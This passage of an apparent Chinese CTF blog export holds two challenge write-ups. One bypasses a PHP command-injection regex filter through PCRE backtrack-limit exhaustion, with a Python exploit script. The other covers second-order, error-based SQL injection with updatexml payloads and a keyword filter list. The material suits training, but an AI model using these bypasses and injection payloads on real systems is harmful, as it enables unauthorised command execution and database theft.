<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">putenv(<span class="string">&#x27;PATH=/home/rceservice/jail&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_REQUEST[<span class="string">&#x27;cmd&#x27;</span>])) &#123;</span><br><span class="line">  $json = $_REQUEST[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!is_string($json)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Hacking attempt detected&lt;br/&gt;&lt;br/&gt;&#x27;</span>;</span><br><span class="line">  &#125; <span class="keyword">elseif</span> (preg_match(<span class="string">&#x27;/^.*(alias|bg|bind|break|builtin|case|cd|command|compgen|complete|continue|declare|dirs|disown|echo|enable|eval|exec|exit|export|fc|fg|getopts|hash|help|history|if|jobs|kill|let|local|logout|popd|printf|pushd|pwd|read|readonly|return|set|shift|shopt|source|suspend|test|times|trap|type|typeset|ulimit|umask|unalias|unset|until|wait|while|[\x00-\x1FA-Z0-9!#-\/;-@\[-`|~\x7F]+).*$/&#x27;</span>, $json)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Hacking attempt detected&lt;br/&gt;&lt;br/&gt;&#x27;</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Attempting to run command:&lt;br/&gt;&#x27;</span>;</span><br><span class="line">    $cmd = json_decode($json, <span class="literal">true</span>)[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> ($cmd !== <span class="literal">NULL</span>) &#123;</span><br><span class="line">      system($cmd);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&#x27;Invalid input&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;br/&gt;&lt;br/&gt;&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>这道题注意这里：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">putenv(<span class="string">&#x27;PATH=/home/rceservice/jail&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p>所以我们想要执行命令的话必须通过/bin/cat来执行系统命令（本人不是很能明白原因。。）</p>
<p>正则绕过，这里可以通过P牛大佬的文章：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.leavesongs.com&#x2F;PENETRATION&#x2F;use-pcre-backtrack-limit-to-bypass-restrict.html</span><br></pre></td></tr></table></figure>

<p>阅读P牛大佬的文章，大致意思是，PHP的正则并不是通过根据正则的匹配来决定下一步的，如果满足条件的话，正则便会无限的向后匹配，直到末尾之后，如果正则没有能够成功匹配结尾，就会往回回溯，来查找到满足条件的情况</p>
<p><img src="FBCTF2018RCEService/image-20201117154441800.png" alt="image-20201117154441800"></p>
<p>类似P牛大佬的例子，如果按照我们的思路的话，当匹配到 ;的时候，已经匹配成功，所以就应该停下来了，但是由于.*可以匹配任意，故我们会一直匹配到最后一步，但此时正则没有匹配成功，就会往前推，直到正则匹配成功。</p>
<p>又因为P牛师傅说的，只要回溯100000此就会失败，所以我们发送一串超级长的字符串即可</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span>  requests</span><br><span class="line"></span><br><span class="line">params = <span class="string">&#x27;&#123;&quot;cmd&quot;:&quot;/bin/cat /home/rceservice/flag&quot;,&quot;123&quot;:&quot;&#x27;</span> + <span class="string">&quot;a&quot;</span>*(<span class="number">1000000</span>) + <span class="string">&#x27;&quot;&#125;&#x27;</span></span><br><span class="line">params = &#123;<span class="string">&quot;cmd&quot;</span>:params&#125;</span><br><span class="line">url = <span class="string">&quot;http://e23f7266-20a3-4aa0-bfbc-8a9502764002.node3.buuoj.cn&quot;</span></span><br><span class="line"></span><br><span class="line">res = requests.post(url=url,data=params).text</span><br><span class="line"></span><br><span class="line">print(res)</span><br></pre></td></tr></table></figure>

<p>注意这里一定要发送post包，get包无法接受这么长的参数，传过去就可以得到flag了</p>
]]></content>
      <tags>
        <tag>BUU</tag>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title>RCTF2015EasySQL</title>
    <url>/2020/11/18/RCTF2015EasySQL/</url>
    <content><![CDATA[<h1 id="考点："><a href="#考点：" class="headerlink" title="考点："></a>考点：</h1><p>一个SQL注入，二次注入+报错注入</p>
<p>当我们注册用户修改密码的时候便会触发</p>
<p>我们可以测试一下被过滤了什么：</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">length </span><br><span class="line">+</span><br><span class="line">handler</span><br><span class="line">like</span><br><span class="line">select </span><br><span class="line">sleep</span><br><span class="line">database</span><br><span class="line">delete</span><br><span class="line">having</span><br><span class="line">or</span><br><span class="line">as</span><br><span class="line">-~</span><br><span class="line">BENCHMARK</span><br><span class="line">limit</span><br><span class="line">left</span><br><span class="line">select</span><br><span class="line">insert</span><br><span class="line">sys.schema_auto_increment_columns</span><br><span class="line">join</span><br><span class="line">right</span><br><span class="line">#</span><br><span class="line">&amp;</span><br><span class="line">&amp;&amp;</span><br><span class="line">\</span><br><span class="line">handler</span><br><span class="line">-- -</span><br><span class="line">--</span><br><span class="line">--+</span><br><span class="line">INFORMATION</span><br><span class="line">--</span><br><span class="line">;</span><br><span class="line">!</span><br><span class="line">%</span><br><span class="line">+</span><br><span class="line">xor</span><br><span class="line">&lt;&gt;</span><br><span class="line">(</span><br><span class="line">&gt;</span><br><span class="line">&lt;</span><br><span class="line">)</span><br><span class="line">.</span><br><span class="line">^</span><br><span class="line">=</span><br><span class="line">AND</span><br><span class="line">BY</span><br><span class="line">CAST</span><br><span class="line">COLUMN</span><br><span class="line">COUNT</span><br><span class="line">CREATE</span><br><span class="line">END</span><br><span class="line">case</span><br><span class="line">&#x27;1&#x27;=&#x27;1</span><br><span class="line">when</span><br><span class="line">admin&#x27;</span><br><span class="line">&quot;</span><br><span class="line">length </span><br><span class="line">+</span><br><span class="line">length</span><br><span class="line">REVERSE</span><br><span class="line"></span><br><span class="line">ascii</span><br><span class="line">select </span><br><span class="line">database</span><br><span class="line">left</span><br><span class="line">right</span><br><span class="line">&#x27;</span><br><span class="line">union</span><br><span class="line">||</span><br><span class="line">oorr</span><br><span class="line">/</span><br><span class="line">//</span><br><span class="line">//*</span><br><span class="line">*/*</span><br><span class="line">/**/</span><br><span class="line">anandd</span><br><span class="line">GROUP</span><br><span class="line">HAVING</span><br><span class="line">IF</span><br><span class="line">INTO</span><br><span class="line">JOIN</span><br><span class="line">LEAVE</span><br><span class="line">LEFT</span><br><span class="line">LEVEL</span><br><span class="line">sleep</span><br><span class="line">LIKE</span><br><span class="line">NAMES</span><br><span class="line">NEXT</span><br><span class="line">NULL</span><br><span class="line">OF</span><br><span class="line">ON</span><br><span class="line">|</span><br><span class="line">infromation_schema</span><br><span class="line">user</span><br><span class="line">OR</span><br><span class="line">ORDER</span><br><span class="line">ORD</span><br><span class="line">SCHEMA</span><br><span class="line">SELECT</span><br><span class="line">SET</span><br><span class="line">TABLE</span><br><span class="line">THEN</span><br><span class="line">UPDATE</span><br><span class="line">USER</span><br><span class="line">USING</span><br><span class="line">VALUE</span><br><span class="line">VALUES</span><br><span class="line">WHEN</span><br><span class="line">WHERE</span><br><span class="line">ADD</span><br><span class="line">AND</span><br><span class="line">prepare</span><br><span class="line">set</span><br><span class="line">update</span><br><span class="line">delete</span><br><span class="line">drop</span><br><span class="line">inset</span><br><span class="line">CAST</span><br><span class="line">COLUMN</span><br><span class="line">CONCAT</span><br><span class="line">GROUP_CONCAT</span><br><span class="line">group_concat</span><br><span class="line">CREATE</span><br><span class="line">DATABASE</span><br><span class="line">DATABASES</span><br><span class="line">alter</span><br><span class="line">DELETE</span><br><span class="line">DROP</span><br><span class="line">floor</span><br><span class="line">rand()</span><br><span class="line">information_schema.tables</span><br><span class="line">TABLE_SCHEMA</span><br><span class="line">%df</span><br><span class="line">concat_ws()</span><br><span class="line">concat</span><br><span class="line">LIMIT</span><br><span class="line">ORD</span><br><span class="line">ON</span><br><span class="line">extractvalue</span><br><span class="line">order </span><br><span class="line">CAST()</span><br><span class="line">by</span><br><span class="line">ORDER</span><br><span class="line">OUTFILE</span><br><span class="line">RENAME</span><br><span class="line">REPLACE</span><br><span class="line">SCHEMA</span><br><span class="line">SELECT</span><br><span class="line">SET</span><br><span class="line">updatexml</span><br><span class="line">SHOW</span><br><span class="line">SQL</span><br><span class="line">TABLE</span><br><span class="line">THEN</span><br><span class="line">TRUE</span><br><span class="line">instr</span><br><span class="line">benchmark</span><br><span class="line">format</span><br><span class="line">bin</span><br><span class="line">substring</span><br><span class="line">ord</span><br><span class="line"></span><br><span class="line">UPDATE</span><br><span class="line">VALUES</span><br><span class="line">VARCHAR</span><br><span class="line">VERSION</span><br><span class="line">WHEN</span><br><span class="line">WHERE</span><br><span class="line">/*</span><br><span class="line">`</span><br><span class="line">  </span><br><span class="line">,</span><br><span class="line">users</span><br><span class="line">%0a</span><br><span class="line">%0b</span><br><span class="line">mid</span><br><span class="line">for</span><br><span class="line">BEFORE</span><br><span class="line">REGEXP</span><br><span class="line">RLIKE</span><br><span class="line">in</span><br><span class="line">sys schemma</span><br><span class="line">SEPARATOR</span><br><span class="line">XOR</span><br><span class="line">CURSOR</span><br><span class="line">FLOOR</span><br><span class="line">sys.schema_table_statistics_with_buffer</span><br><span class="line">INFILE</span><br><span class="line">count</span><br><span class="line">%0c</span><br><span class="line">from</span><br><span class="line">%0d</span><br><span class="line">%a0</span><br><span class="line">=</span><br><span class="line">@</span><br><span class="line">else</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>直接用别人的字典来查一下</p>
<p>大概对我们注入有影响的只有空格，select的话我们可以用大小写的方式进行绕过，于是去mysql里面尝试构造出语句：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">mysql&gt; select * from websites where id &#x3D;1 and(select updatexml(1,concat(&#39;~&#39;,(select(database()))),1));</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &#39;~runoob&#39;</span><br><span class="line">mysql&gt; select * from websites where id &#x3D;1 and(select updatexml(1,concat(&#39;~&#39;,(select(database()))),1));</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &#39;~runoob&#39;</span><br><span class="line">mysql&gt; select * from websites where id &#x3D;1 and(select(updatexml(1,concat(&#39;~&#39;,(select(database()))),1)));</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &#39;~runoob&#39;</span><br></pre></td></tr></table></figure>

<p>得到注入语句：</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">admin&quot;^(select(updatexml(1,concat(&#x27;~&#x27;,(select(database()))),1)))#</span><br><span class="line">#XPATH syntax error: &#x27;~web_sqli&#x27;</span><br></pre></td></tr></table></figure>

<p>得到数据库的名字.</p>
<p>下一步获取表名：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">admin&quot;^(select(updatexml(1,concat(0x7e,(select(table_name)from(information_schema.tables)where(table_schema&#x3D;database()))),0x7e)))#</span><br></pre></td></tr></table></figure>

<p>这样的话会报错，Subquery returns more than 1 row，因为不止一个表，那我们添加group_concat函数</p>
<p>在mysql中测试：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; select * from student where STID&#x3D;1 and (select(updatexml(1,concat(0x7e,(select(table_name)from(information_schema.tables)where(table_schema&#x3D;database()))),0x7e)));</span><br><span class="line">ERROR 1242 (21000): Subquery returns more than 1 row</span><br><span class="line">mysql&gt; select * from student where STID&#x3D;1 and (select(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema&#x3D;database()))),0x7e)));</span><br><span class="line">ERROR 2013 (HY000): Lost connection to MySQL server during query</span><br><span class="line">mysql&gt; select * from student where STID&#x3D;1 and (select(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema&#x3D;database()))),0x7e)));</span><br></pre></td></tr></table></figure>

<p>得到表名：</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">XPATH syntax error: &#x27;~article,flag,users&#x27;</span><br></pre></td></tr></table></figure>

<p>这里提前剧透一下，flag表的东西是假flag，纯粹作者搞心态的，我一直觉得这种东西很多余好吧。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; select * from student WHERE STID&#x3D;1 and(select updatexml(1,concat(0x7e,(select group_concat(column_name)from information_schema.columns where table_name&#x3D;&quot;student&quot;)),0x7e));</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &#39;~STID,STNAME,STSEX,STAGE,STPHONE&#39;</span><br><span class="line">mysql&gt; select * from student WHERE STID&#x3D;1 and(select updatexml(1,concat(0x7e,(select group_concat(column_name)from information_schema.columns where table_name&#x3D;&quot;student&quot;)),0x7e));</span><br></pre></td></tr></table></figure>

<p>得到字段名：</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">XPATH syntax error: &#x27;~name,pwd,email,real_flag_1s_her&#x27;</span><br></pre></td></tr></table></figure>

<p>这里其实我们就可以发现一个不方便的地方了，报错注入的回显是有限的，所以这里后面应该是here，却没有显示出来</p>
<p>注入：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">admin&quot;^(select(updatexml(1,concat(0x7e,(select(group_concat(real_flag_1s_here))from(users))),0x7e)))#</span><br></pre></td></tr></table></figure>

<p>得到的东西很奇怪：</p>
<p>~xxxx,xxx,xxx什么的，这就很恶心人了，于是我们尝试用正则表达式来匹配我们需要的数据</p>
<p>别人的语句：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">admin&quot;||(updatexml(1,concat(0x3a,(select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp(&#39;^f&#39;))),1))#</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>得到前半段的flag：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">XPATH syntax error: &#39;:flag&#123;8091937b-0547-42a3-b7b3-41&#39;</span><br></pre></td></tr></table></figure>

<p>这样的话还是不够，我们应该获取全部的数据，于是继续构造：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &#39;~fuzhufuzh&#39;</span><br><span class="line">mysql&gt;  select * from student where STID &#x3D;1 and(select(updatexml(1,concat(0x7e,(select(group_concat(STNAME))from student)),0x7e)));</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &#39;~fuzhufuzh&#39;</span><br><span class="line">mysql&gt;  select * from student where STID &#x3D;1 and(select(updatexml(1,concat(0x7e,(select reverse((group_concat(STNAME)))from student)),0x7e)));</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &#39;~hzufuhzuf&#39;</span><br><span class="line">mysql&gt;  select * from student where STID &#x3D;1 and(select(updatexml(1,concat(0x7e,(select(reverse((group_concat(STNAME))))from student)),0x7e)));</span><br><span class="line">ERROR 2013 (HY000): Lost connection to MySQL server during query</span><br><span class="line">mysql&gt;  select * from student where STID &#x3D;1 and(select(updatexml(1,concat(0x7e,(select(reverse((group_concat(STNAME))))from student)),0x7e)));</span><br><span class="line">ERROR 2006 (HY000): MySQL server has gone away</span><br><span class="line">No connection. Trying to reconnect...</span><br><span class="line">Connection id:    11</span><br><span class="line">Current database: webos</span><br><span class="line"></span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &#39;~hzufuhzuf&#39;</span><br><span class="line">mysql&gt;  select * from student where STID &#x3D;1 and(select(updatexml(1,concat(0x7e,(select(reverse((group_concat(STNAME))))from student)),0x7e)));</span><br></pre></td></tr></table></figure>

<p>因为Markdown自动的弱智不全，导致我fuzz了巨他妈久</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">admin&quot;||(updatexml(1,concat(0x3a,(select(reverse(group_concat(real_flag_1s_here)))from(users)where(real_flag_1s_here)regexp(&#39;^f&#39;))),1))#</span><br></pre></td></tr></table></figure>

<p><img src="image-20201118221117122.png" alt="image-20201118221117122"></p>
<p>得到flag：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag&#123;8091937b-0547-42a3-b7b3-415a267a6a46&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>BUU</tag>
        <tag>SQL注入</tag>
      </tags>
  </entry>
</search>
